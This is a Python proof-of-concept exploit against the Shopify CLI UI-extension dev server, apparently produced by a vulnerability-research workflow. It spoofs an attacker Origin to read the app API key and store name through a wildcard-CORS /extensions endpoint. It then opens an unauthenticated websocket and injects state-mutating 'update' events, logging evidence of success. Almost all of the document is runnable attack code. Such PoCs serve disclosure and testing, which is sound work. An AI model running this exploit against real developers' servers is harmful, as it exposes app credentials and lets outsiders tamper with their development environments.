#!/usr/bin/env python3
"""
PoC for Shopify CLI UI-extension dev server unauthenticated control plane.
Runs against a live `shopify app dev` extension server base URL.

Usage after placeholder substitution:
  ./poc.py [base_url]
or:
  BASE_URL=http://127.0.0.1:<extension-port> ./poc.py
"""
import base64
import hashlib
import http.client
import json
import os
import random
import socket
import ssl
import struct
import sys
from pathlib import Path
from urllib.parse import urlparse

DEFAULT_BASE_URL = "{{BASE_URL}}"
ATTACKER_ORIGIN = os.environ.get("ORIGIN", "https://attacker.example")
GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"

class BufferedSocket:
    def __init__(self, sock, pending=b""):
        self.sock = sock
        self.pending = bytearray(pending)

    def recv(self, n):
        if self.pending:
            out = self.pending[:n]
            del self.pending[:n]
            return bytes(out)
        return self.sock.recv(n)

    def sendall(self, data):
        return self.sock.sendall(data)

    def close(self):
        return self.sock.close()


finding_dir = Path(__file__).resolve().parent
evidence_dir = finding_dir / "evidence"
evidence_dir.mkdir(exist_ok=True)
log_lines = []


def log(line):
    log_lines.append(line)
    print(line)


def finish(status, evidence, notes=""):
    (evidence_dir / "exploit.log").write_text("\n".join(log_lines) + "\n", encoding="utf-8")
    (evidence_dir / "impact.log").write_text(f"status={status}\nevidence={evidence}\nnotes={notes}\n", encoding="utf-8")
    print(json.dumps({"status": status, "evidence": evidence, "notes": notes}, separators=(",", ":")))
    sys.exit(0 if status == "confirmed" else 1)


def base_url():
    value = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("BASE_URL", DEFAULT_BASE_URL)
    if not value or "{{" in value:
        finish("inconclusive", "BASE_URL placeholder was not substituted", "pass the extension dev-server URL as argv[1] or BASE_URL")
    if "://" not in value:
        value = "http://" + value
    parsed = urlparse(value)
    if parsed.scheme not in ("http", "https") or not parsed.hostname:
        finish("failed", "invalid BASE_URL", value)
    return parsed


def target_path(parsed, suffix="/extensions"):
    prefix = parsed.path.rstrip("/")
    if not prefix:
        return suffix
    if prefix.endswith("/extensions") and suffix == "/extensions":
        return prefix
    return prefix + suffix


def http_get_json(parsed, path):
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    conn_cls = http.client.HTTPSConnection if parsed.scheme == "https" else http.client.HTTPConnection
    conn = conn_cls(parsed.hostname, port, timeout=8)
    conn.request(
        "GET",
        path,
        headers={
            "Accept": "application/json",
            "Origin": ATTACKER_ORIGIN,
            "ngrok-skip-browser-warning": "1",
        },
    )
    resp = conn.getresponse()
    body = resp.read()
    headers = {k.lower(): v for k, v in resp.getheaders()}
    try:
        data = json.loads(body.decode("utf-8"))
    except Exception:
        data = None
    conn.close()
    return resp.status, headers, body, data


def read_until(sock, marker):
    buf = b""
    while marker not in buf:
        chunk = sock.recv(4096)
        if not chunk:
            break
        buf += chunk
        if len(buf) > 65536:
            break
    return buf


def ws_connect(parsed, path):
    secure = parsed.scheme == "https"
    port = parsed.port or (443 if secure else 80)
    raw = socket.create_connection((parsed.hostname, port), timeout=8)
    raw.settimeout(8)
    sock = ssl.create_default_context().wrap_socket(raw, server_hostname=parsed.hostname) if secure else raw
    key = base64.b64encode(os.urandom(16)).decode()
    host = parsed.hostname if parsed.port is None else f"{parsed.hostname}:{port}"
    request = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: {key}\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        f"Origin: {ATTACKER_ORIGIN}\r\n"
        "\r\n"
    ).encode("ascii")
    sock.sendall(request)
    response = read_until(sock, b"\r\n\r\n")
    header, sep, pending = response.partition(b"\r\n\r\n")
    header_text = (header + sep).decode("iso-8859-1", "replace")
    if " 101 " not in header_text.split("\r\n", 1)[0]:
        sock.close()
        finish("failed", "websocket upgrade was rejected", header_text.split("\r\n", 1)[0])
    expected_accept = base64.b64encode(hashlib.sha1((key + GUID).encode()).digest()).decode()
    if expected_accept.lower() not in header_text.lower():
        sock.close()
        finish("failed", "websocket accept header mismatch", "upgrade did not complete as RFC6455")
    return BufferedSocket(sock, pending)


def recv_exact(sock, n):
    data = b""
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            raise EOFError("socket closed")
        data += chunk
    return data


def ws_send(sock, obj, opcode=0x1):
    payload = json.dumps(obj, separators=(",", ":")).encode("utf-8") if not isinstance(obj, bytes) else obj
    header = bytearray([0x80 | opcode])
    length = len(payload)
    if length < 126:
        header.append(0x80 | length)
    elif length < 65536:
        header.append(0x80 | 126)
        header.extend(struct.pack("!H", length))
    else:
        header.append(0x80 | 127)
        header.extend(struct.pack("!Q", length))
    mask = os.urandom(4)
    masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
    sock.sendall(bytes(header) + mask + masked)


def ws_recv(sock):
    b1, b2 = recv_exact(sock, 2)
    opcode = b1 & 0x0F
    length = b2 & 0x7F
    if length == 126:
        length = struct.unpack("!H", recv_exact(sock, 2))[0]
    elif length == 127:
        length = struct.unpack("!Q", recv_exact(sock, 8))[0]
    masked = bool(b2 & 0x80)
    mask = recv_exact(sock, 4) if masked else b""
    payload = recv_exact(sock, length) if length else b""
    if masked:
        payload = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
    return opcode, payload


def ws_recv_json(sock):
    while True:
        opcode, payload = ws_recv(sock)
        if opcode == 0x1:
            return json.loads(payload.decode("utf-8"))
        if opcode == 0x8:
            raise EOFError("websocket closed")
        if opcode == 0x9:
            ws_send(sock, payload, opcode=0xA)


def redacted(value):
    if not isinstance(value, str):
        return "<missing>"
    return value[:4] + "..." + value[-4:] if len(value) > 8 else "<redacted>"


def main():
    parsed = base_url()
    path = target_path(parsed)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    log(f"Target: {origin}{path}")
    log(f"Spoofed browser Origin: {ATTACKER_ORIGIN}")

    status, headers, body, raw = http_get_json(parsed, path)
    cors = headers.get("access-control-allow-origin", "")
    if status != 200 or not isinstance(raw, dict):
        finish("failed", "GET /extensions did not return JSON payload", f"HTTP {status}, first bytes={body[:80]!r}")
    if cors != "*":
        finish("failed", "CORS wildcard was not present", f"Access-Control-Allow-Origin={cors!r}")

    app = raw.get("app") or {}
    api_key = [REDACTED:secret]"apiKey")
    store = raw.get("store")
    extensions = raw.get("extensions") or []
    if not api_key or not store:
        finish("failed", "payload missing app apiKey/store metadata", "unexpected /extensions shape")
    log(f"CORS-readable /extensions exposed store={store!r}, app.apiKey=[REDACTED:secret]}, extensions={len(extensions)}")

    sock = ws_connect(parsed, path)
    connected = ws_recv_json(sock)
    if connected.get("event") != "connected":
        finish("failed", "websocket did not send connected payload", str(connected)[:200])
    connected_data = connected.get("data") or {}
    log(f"Unauthenticated websocket received connected payload keys={sorted(connected_data.keys())}")

    marker = f"piolium-poc-{random.randrange(1 << 32):08x}"
    ws_send(sock, {"event": "update", "data": {"app": {"apiKey": api_key, "pioliumPocMarker": marker}}})
    log(f"Sent unauthenticated update event with marker={marker}")

    observed_update = False
    for _ in range(5):
        msg = ws_recv_json(sock)
        if msg.get("event") == "update" and ((msg.get("data") or {}).get("app") or {}).get("pioliumPocMarker") == marker:
            observed_update = True
            break
    if not observed_update:
        finish("failed", "websocket update marker was not broadcast", "server accepted connection but did not echo mutation")

    status2, _, _, raw2 = http_get_json(parsed, path)
    persisted = isinstance(raw2, dict) and (raw2.get("app") or {}).get("pioliumPocMarker") == marker
    sock.close()
    if not persisted:
        finish("confirmed", "unauthenticated websocket update broadcast marker", f"marker={marker}; HTTP persistence check returned {status2}")

    finish("confirmed", "CORS-readable payload and unauthenticated websocket state mutation", f"store={store}; marker={marker}")


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:
        finish("failed", "PoC exception before confirmation", repr(exc))
